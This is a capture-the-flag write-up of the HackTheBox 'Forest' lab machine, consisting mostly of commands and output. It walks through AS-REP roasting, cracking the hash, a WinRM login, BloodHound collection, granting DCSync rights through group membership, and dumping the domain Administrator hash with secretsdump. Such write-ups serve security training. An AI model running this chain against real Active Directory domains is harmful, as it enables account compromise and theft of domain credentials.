---
title: HackTheBox-Forest
date: 2024-12-23 09:37:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [add-domain-group-member, asrep]     # TAG names should always be lowercase
---

## SMB-enum

    ➜  forest nxc smb 10.10.10.161
    SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)

## rpcclient

    ➜  forest rpcclient -U "" -N 10.10.10.161
    rpcclient $> enumdomusers


    ➜  forest cat rpc_users.txt | sed 's/user://g' | sed 's/\[//g' | sed 's/\]//g' | awk '{print $1}' > users.txt

## ASREP

    ➜  forest impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 -usersfile users.txt -request htb.local/


    hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force

    $krb5asrep$23$svc-alfresco@HTB.LOCAL:7c791310283b8d5f36e0cfdf20cdd0b4$1bdd25c93680caf7bdce104ccfa45a94080188d77408edc5e864c1593de0c2e922dbcf78670aba1a4e5e8e77befbb3f630902de85a8c69ac09ebbe4a5776eb11b5b974075445ff8f87edd4b1a4eac1ead04b70b8805d221e05e48a3156a1f116a4aec2d76bf5f952ba12ef61d9ecac954f4c5d7817643ba05cb6b5ec570ad8e89a4056a0ae64a24ac9a5e1687aa202f826cb473ca1524e0447c75aab01b97073d7a51a14852b6e1e5aec825d9d2040cb5e49a2db6074f94a7611b7856a3b1aa06a1ad3a9d454a1f52a0c46ef57f267e1e32cec6a82bd30151cac930b56cc2de03934d3beeccb:s3rvice

    svc-alfresco : s3rvice

## winrm-shell

    ➜  forest nxc winrm 10.10.10.161 -u svc-alfresco -p 's3rvice'
    WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
    WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

## bloodhound linux-abuse

    ➜  bloodhound bloodhound-python -d htb.local -c all -u svc-alfresco -p 's3rvice' --zip -ns 10.10.10.161

## add-domain-group-member

### Windows Abuse
    Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync

### Linux Abuse

    (myenv) ➜  forest bloodyAD --host "10.10.10.161" -d "htb.local" -u "svc-alfresco" -p "s3rvice" add groupMember "Exchange Windows Permissions" "svc-alfresco"

## secretsdump

    ➜  forest impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

Video walkthrough
[WATCH!](https://youtu.be/fmkgqT4hYrQ?si=LS7HQ49KgGrQSW7K)